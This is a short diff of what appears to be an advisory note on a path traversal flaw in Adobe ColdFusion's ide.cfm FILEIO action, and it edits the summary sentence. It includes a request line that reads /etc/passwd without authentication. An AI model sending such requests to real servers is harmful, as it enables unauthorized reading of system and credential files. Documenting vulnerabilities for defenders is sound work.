@@ -1,6 +1,7 @@
 # Adobe ColdFusion CVE-2026-48313 FILEIO path traversal
 
-Adobe ColdFusion 2025.9, 2023.20 and earlier are affected by a path traversal in the `ide.cfm` FILEIO action (CWE-22, scope changed) allowing unauthenticated arbitrary file read and limited write.
+**CVE-2026-48313** is a path traversal in Adobe ColdFusion that can expose
+files and allow limited writes without authentication (CWE-22).
 
 ```text
 POST /CFIDE/main/ide.cfm?ACTION=FILEIO    2:000011:/etc/passwd000004:READ
